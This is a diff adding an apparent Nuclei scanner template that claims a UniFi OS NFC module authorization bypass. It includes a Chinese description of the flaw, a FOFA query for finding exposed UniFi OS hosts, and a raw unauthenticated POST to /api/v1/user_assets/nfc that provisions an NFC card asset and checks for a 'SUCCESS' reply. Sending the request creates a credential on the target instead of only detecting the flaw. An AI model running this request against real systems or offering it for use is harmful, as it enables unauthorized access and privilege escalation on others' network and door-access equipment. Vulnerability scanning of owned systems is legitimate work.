@@ -1,0 +1,37 @@
+id: unifi-os-nfc-privilege-creation-bypass
+
+info:
+  name: "UniFi OS NFC 模块权限绕过漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="UniFi OS"
+      漏洞源于 UniFi OS 的 NFC 功能模块缺乏有效的身份验证机制，攻击者可通过构造特定请求绕过授权流程，实现对受保护功能的未授权访问。该缺陷可能被利用执行权限提升操作或获取敏感系统控制权。
+  tags: UniFi
+
+http:
+- raw:
+  - |
+    POST /api/v1/user_assets/nfc HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+
+    {
+      "alias": "NdayTest",
+      "asset_id": "1",
+      "need_provision": true,
+      "nfc_id": "1",
+      "plain_token": "1",
+      "sys_id": "1",
+      "token": "1",
+      "ua_card_id": "1",
+      "ua_card_pub_key": "1"
+    }
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'SUCCESS'
